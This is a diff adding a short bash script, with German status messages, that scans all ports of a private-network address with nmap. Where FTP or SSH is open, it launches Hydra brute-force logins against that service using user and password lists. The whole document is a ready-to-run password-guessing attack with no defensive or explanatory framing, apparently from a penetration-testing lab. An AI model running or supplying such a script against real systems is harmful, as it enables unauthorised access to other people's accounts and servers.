@@ -1,0 +1,41 @@
+TARGET_IP="192.168.62.135" 
+
+NMAP_RESULTS="nmap_results.txt" 
+
+HYDRA_RESULTS="hydra_results.txt" 
+
+echo "[+] Starte Nmap-Scan für $TARGET_IP..." 
+
+nmap -p- --open -T4 -oN $NMAP_RESULTS $TARGET_IP 
+
+echo "[+] Nmap-Scan abgeschlossen. Ergebnisse gespeichert in $NMAP_RESULTS" 
+
+if grep -q "21/tcp open" $NMAP_RESULTS; then 
+
+    echo "[+] Port 21 ist offen. Starte Hydra-Bruteforce für FTP..." 
+
+    hydra -L users.txt -P passwords.txt ftp://$TARGET_IP -o $HYDRA_RESULTS 
+
+    echo "[+] Hydra-Bruteforce abgeschlossen. Ergebnisse gespeichert in $HYDRA_RESULTS" 
+
+else 
+
+    echo "[-] Port 21 (FTP) ist nicht offen. Kein Angriff mit Hydra möglich." 
+
+fi 
+
+if grep -q "22/tcp open" $NMAP_RESULTS; then 
+
+    echo "[+] Port 22 ist offen. Starte Hydra-Bruteforce für SSH..." 
+
+    hydra -L users.txt -P passwords.txt ssh://$TARGET_IP -o ssh_hydra_results.txt 
+
+    echo "[+] Hydra-Bruteforce für SSH abgeschlossen. Ergebnisse gespeichert in ssh_hydra_results.txt" 
+
+else 
+
+    echo "[-] Port 22 (SSH) ist nicht offen. Kein Angriff mit Hydra möglich." 
+
+fi 
+
+echo "[+] Alle Angriffe abgeschlossen!" 
